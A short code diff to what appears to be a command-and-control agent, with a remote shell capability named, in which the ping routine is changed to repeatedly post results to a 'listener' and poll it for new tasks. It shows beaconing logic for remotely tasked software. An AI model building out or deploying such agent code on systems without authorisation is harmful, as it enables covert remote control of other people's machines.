@@ -123,10 +123,12 @@ def shell_capability(task_id, arguments, connection):
 
 
 def ping_capability(task_id, arguments, connection):
-    connection.post_results_to_listener(
-        task_id=task_id,
-        success=True,
-    )
+    for _ in range(arguments["iterations"]):
+        connection.post_results_to_listener(
+            task_id=task_id,
+            success=True,
+        )
+        _ = connection.get_tasks_from_listener()
 
 
 def sleep_capability(task_id, arguments, connection):
